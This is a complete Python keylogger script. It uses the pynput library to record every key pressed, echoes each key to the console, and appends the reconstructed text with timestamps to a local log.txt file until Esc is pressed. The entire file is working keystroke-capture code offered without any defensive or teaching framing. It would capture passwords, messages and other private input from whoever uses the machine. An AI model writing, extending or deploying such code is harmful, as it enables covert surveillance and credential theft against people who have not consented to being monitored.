from typing import List
import pynput
from datetime import datetime

# Define constants
LOG_FILE = "log.txt"
MAX_KEYS = 10

# Initialize key counter and list of keys
count = 0
keys = []


def on_press(key):
    global keys, count

    # Append key to list and increment counter
    keys.append(key)
    count += 1

    # Print key to console
    print(f"Pressed: {key}")

    # Write keys to file if count threshold is reached
    if count >= MAX_KEYS:
        write_file(keys)
        keys = []
        count = 0


def write_file(keys):
    with open(LOG_FILE, "a") as f:
        now = datetime.now()
        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
        f.write(f"\n\n{date_time}\n")
        words = []
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.enter":
                f.write("".join(words) + "\n")
                words = []
            elif k == "Key.space":
                words.append(" ")
            elif k.find("Key") == -1:
                words.append(k)
        f.write("".join(words))


def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False


# Start listener
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
